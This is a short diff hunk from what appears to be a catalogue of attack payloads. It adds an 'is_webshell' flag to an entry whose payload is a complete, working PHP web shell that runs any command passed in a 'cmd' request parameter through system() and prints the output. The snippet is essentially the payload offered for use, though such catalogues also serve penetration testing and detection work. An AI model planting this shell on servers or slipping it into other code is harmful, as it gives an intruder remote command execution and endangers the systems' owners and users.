@@ -5,6 +5,7 @@ type = "web"
 proto = ""
 lang = "php"
 description = "Another simple PHP web shell that provides a browser-based command execution form. Accepts a cmd parameter via GET request and runs it with system(), displaying the output in the page."
+is_webshell = true
 
 payload = "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>"
 
